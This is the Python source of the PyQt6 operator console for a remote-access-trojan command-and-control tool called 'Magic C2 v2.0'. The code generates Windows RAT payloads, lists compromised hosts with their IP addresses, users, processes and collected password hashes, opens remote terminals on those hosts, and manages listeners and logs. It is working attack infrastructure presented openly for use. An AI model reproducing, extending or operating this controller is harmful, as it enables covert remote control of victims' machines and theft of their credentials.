import os
import json
import time
import base64
from PyQt6.QtCore import Qt, QTimer
from PyQt6.QtGui import QIcon, QAction
from PyQt6.QtWidgets import QMenu, QWidget, QToolBar, QSplitter, QTabWidget, QMainWindow, QHeaderView, QTableWidget, QVBoxLayout, QTableWidgetItem

from Public.IM import IM
from Public.SQL import SQL
# 以下模块用于反射调用, 需保留代码! ! !
from Console.Log import Log
from MenuOption.RAT.RAT import RAT
from Console.Listener import Listener
from Console.Terminal import Terminal

class SessionController(QMainWindow):
    loginObj = None
    sidColumn = 1
    userColumn = 5
    noteColumn = 7
    sleepColumn = 8
    sessionInfoList = []

    def __init__(self):
        super().__init__()
        self.resize(940, 570)
        self.setWindowTitle('Magic C2 v2.0 - 𝐇𝐚𝐩𝐩𝐲 𝐍𝐞𝐰 𝐘𝐞𝐚𝐫 𝟐𝟎𝟐𝟓! 🐍')

        menu_Bar = self.menuBar()
        rat_Menu = menu_Bar.addMenu('RAT')
        rat_Action = QAction(QIcon('Image\\010.png'), 'windows', self)
        rat_Action.triggered.connect(lambda: self.OpenMenuOption_Triggered('RAT', 'ratObj', rat_Action.text()))
        rat_Menu.addAction(rat_Action)

        tool_Bar = QToolBar()
        self.addToolBar(tool_Bar)
        listener_Action = QAction(QIcon('Image\\listener.png'), '', self)
        listener_Action.triggered.connect(lambda: self.OpenConsole_Triggered('Listener', 'listenerObj', 'Listener'))
        tool_Bar.addAction(listener_Action)
        log_Action = QAction(QIcon('Image\\log.png'), '', self)
        log_Action.triggered.connect(lambda: self.OpenConsole_Triggered('Log', 'logObj', 'Log'))
        tool_Bar.addAction(log_Action)

        central_Widget = QWidget()
        self.setCentralWidget(central_Widget)
        allVertical_Layout = QVBoxLayout(central_Widget)
        allVertical_Layout.setContentsMargins(0, 0, 0, 0)
        splitter = QSplitter(Qt.Orientation.Vertical)
        allVertical_Layout.addWidget(splitter)

        self.sessionInfoList_Table = QTableWidget(0, 9)
        self.sessionInfoList_Table.setColumnWidth(0, 22)
        self.sessionInfoList_Table.setColumnWidth(1, 70)
        self.sessionInfoList_Table.setColumnWidth(2, 140)
        self.sessionInfoList_Table.setColumnWidth(3, 140)
        self.sessionInfoList_Table.setColumnWidth(8, 70)
        self.sessionInfoList_Table.verticalHeader().setVisible(False)
        self.sessionInfoList_Table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.sessionInfoList_Table.horizontalHeader().setSectionResizeMode(self.noteColumn, QHeaderView.ResizeMode.Stretch)
        self.sessionInfoList_Table.setHorizontalHeaderLabels(['OS', 'SID', 'External', 'Internal', 'Listener', 'User', 'Process', 'Note', 'Sleep'])
        self.sessionInfoList_Table.setStyleSheet('QTableWidget { gridline-color: transparent; } QTableWidget::item { border-bottom: 1px solid white; }')
        self.sessionInfoList_Table.itemChanged.connect(self.UpdateSessionNote_ItemChanged)
        self.sessionInfoList_Table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.sessionInfoList_Table.customContextMenuRequested.connect(self.InfoMenu_CustomContextMenuRequested)
        splitter.addWidget(self.sessionInfoList_Table)
        sleepUpdater = QTimer(self)
        sleepUpdater.timeout.connect(self.UpdataSessionSleep)
        sleepUpdater.start(1000)

        self.console_Tab = QTabWidget()
        self.console_Tab.setTabsClosable(True)
        self.console_Tab.tabCloseRequested.connect(self.CloseConsole_TabCloseRequested)
        splitter.addWidget(self.console_Tab)
        splitter.setSizes([(self.height() // 5) * 2, (self.height() // 5) * 3])

    def UpdateSessionInfo(self, sessionInfo):
        sessionInfo['hashInfo'] = json.loads(sessionInfo['hashInfo'])
        for row in range(self.sessionInfoList_Table.rowCount()):
            sid = self.sessionInfoList_Table.item(row, self.sidColumn).text()
            if sid == sessionInfo['sid']:
                SessionController.sessionInfoList[row]['user'] = sessionInfo['user']
                SessionController.sessionInfoList[row]['sleep'] = sessionInfo['sleep']
                SessionController.sessionInfoList[row]['pid'] = sessionInfo['pid']
                SessionController.sessionInfoList[row]['hashInfo'] = sessionInfo['hashInfo']
                return
        SessionController.sessionInfoList = [sessionInfo] + SessionController.sessionInfoList
        self.sessionInfoList_Table.insertRow(0)
        icon_Item = QTableWidgetItem()
        icon_Item.setIcon(QIcon(f'Image\\{sessionInfo["os"]}.png'))
        self.sessionInfoList_Table.setItem(0, 0, icon_Item)
        self.sessionInfoList_Table.setItem(0, self.sidColumn, QTableWidgetItem(sessionInfo['sid']))
        self.sessionInfoList_Table.setItem(0, 2, QTableWidgetItem(sessionInfo['external']))
        self.sessionInfoList_Table.setItem(0, 3, QTableWidgetItem(sessionInfo['internal']))
        self.sessionInfoList_Table.setItem(0, 4, QTableWidgetItem(sessionInfo['listener']))
        self.sessionInfoList_Table.setItem(0, self.userColumn, QTableWidgetItem(sessionInfo['user']))
        self.sessionInfoList_Table.setItem(0, 6, QTableWidgetItem(os.path.basename(sessionInfo['process'])))
        self.sessionInfoList_Table.setItem(0, self.noteColumn, QTableWidgetItem(sessionInfo['note']))
        self.sessionInfoList_Table.setItem(0, self.sleepColumn, QTableWidgetItem())
        for column in range(self.sessionInfoList_Table.columnCount()):
            if column != self.noteColumn:
                self.sessionInfoList_Table.item(0, column).setTextAlignment(Qt.AlignmentFlag.AlignCenter)
                self.sessionInfoList_Table.item(0, column).setFlags(Qt.ItemFlag.ItemIsSelectable | Qt.ItemFlag.ItemIsEnabled)

    # 每秒触发函数更新 sleep 和 user
    def UpdataSessionSleep(self):
        for i in range(len(SessionController.sessionInfoList)):
            unit = 's'
            sleep = (time.time_ns() - int(SessionController.sessionInfoList[i]['sleep'])) * 1e-9
            if sleep > 60:
                unit = 'min'
                sleep /= 60
                if sleep > 60:
                    unit = 'h'
                    sleep /= 60
                    if sleep > 24:
                        unit = 'day'
                        sleep /= 24
            self.sessionInfoList_Table.item(i, self.sleepColumn).setText(str(format(sleep, '.1f')) + unit)
            self.sessionInfoList_Table.item(i, self.userColumn).setText(SessionController.sessionInfoList[i]['user'])

    def UpdateSessionNote_ItemChanged(self, item):
        if item.column() == self.noteColumn and item.text() != SessionController.sessionInfoList[item.row()]['note']:
            SessionController.sessionInfoList[item.row()]['note'] = item.text()
            IM.Send({'obj': 'Session', 'func': 'UpdateSessionNote', 'paras': {'sid': SessionController.sessionInfoList[item.row()]['sid'], 'note': item.text()}})

    def InfoMenu_CustomContextMenuRequested(self, pos):
        index = self.sessionInfoList_Table.indexAt(pos)
        if index.isValid():
            menu = QMenu(self)
            terminal_Action = QAction(QIcon('Image\\scratche.png'), 'Terminal', self)
            menu.addAction(terminal_Action)
            delete_Action = QAction(QIcon('Image\\delete.png'), 'Delete', self)
            menu.addAction(delete_Action)
            purge_Action = QAction(QIcon('Image\\purge.png'), 'Purge', self)
            menu.addAction(purge_Action)
            sid = SessionController.sessionInfoList[index.row()]['sid']
            action = menu.exec(self.sessionInfoList_Table.mapToGlobal(pos))
            if action == terminal_Action:
                self.OpenConsole_Triggered('Terminal', f'rat{sid}Obj', f'RAT {sid}', SessionController.sessionInfoList[index.row()])
            elif action == delete_Action:
                del SessionController.sessionInfoList[index.row()]
                self.sessionInfoList_Table.removeRow(index.row())
            elif action == purge_Action:
                IM.Send({'obj': 'Session', 'func': 'DeleteSessionInfo', 'paras': {'sid': sid}})
                del SessionController.sessionInfoList[index.row()]
                self.sessionInfoList_Table.removeRow(index.row())

    def OpenMenuOption_Triggered(self, className, objName, option):
        setattr(self, objName, globals()[className]())
        obj = getattr(self, objName)
        obj.option = option
        obj.show()

    def OpenConsole_Triggered(self, className, objName, consoleName, sessionInfo=None):
        index = None
        for i in range(self.console_Tab.count()):
            if self.console_Tab.tabText(i) == consoleName:
                index = i
                break
        if index != None:
            self.console_Tab.setCurrentIndex(index)
        else:
            setattr(self, objName, globals()[className]())
            obj = getattr(self, objName)
            if className == 'Terminal':
                obj.sessionInfo = sessionInfo
            self.console_Tab.addTab(obj, consoleName)
            self.console_Tab.setCurrentWidget(obj)

    def CloseConsole_TabCloseRequested(self, index):
        self.console_Tab.widget(index).deleteLater()
        self.console_Tab.removeTab(index)

    def ParseInfo(self, info):
        try:
            for _type, subInfo in info.items():
                if _type.isdigit(): # sid
                    self.UpdateSessionInfo(subInfo)

                elif _type == 'outputInfo':
                    if subInfo['note'] == 'cmd':
                        subInfo['content'] = base64.b64decode(subInfo['content'].encode()).decode('GBK')
                    getattr(self, f'rat{subInfo["sid"]}Obj').AddContent(subInfo['content'])

                elif _type == 'ratInfo':
                    getattr(self, f'ratObj').GenerateRAT(subInfo)

                elif _type == 'sessionInfoList':
                    for sessionInfo in subInfo:
                        self.UpdateSessionInfo(sessionInfo)

                elif _type == 'terminalContent':
                    content = bytes.fromhex(subInfo['content']).decode('UTF-8').split('\n')
                    for line in content:
                        getattr(self, f'rat{subInfo["sid"]}Obj').AddContent(line, '', False)

                elif _type == 'latestLog':
                    getattr(self, 'logObj').AddLatestLog(subInfo)

                elif _type == 'olderLogList':
                    getattr(self, 'logObj').UpdateOlderLogList(subInfo)

                elif _type == 'listenerInfoList':
                    getattr(self, 'listenerObj').SetListenerInfoList(subInfo)

                elif _type == 'listenerNameList':
                    getattr(self, 'ratObj').SetListenerNameList(subInfo)

                elif _type == 'cookie':
                    IM.loginInfo['cookie'] = subInfo
                    id = SQL.SqlExec('SELECT id FROM LoginInfo WHERE url=? AND username=? AND password=?', [IM.loginInfo['url'], IM.loginInfo['username'], IM.password], True)
                    if id:
                        id = id[0]['id']
                    else:
                        id = None
                    SQL.SqlExec('REPLACE INTO LoginInfo (id, url, username, password, cookie) VALUES (?, ?, ?, ?, ?)', [id, IM.loginInfo['url'], IM.loginInfo['username'], IM.password, IM.loginInfo['cookie']])
                    self.loginObj.hide()
                    self.show()

                elif _type == 'exit':
                    if not self.loginObj.isVisible():
                        self.loginObj.deleteLater()
                        self.deleteLater()
        except:
            pass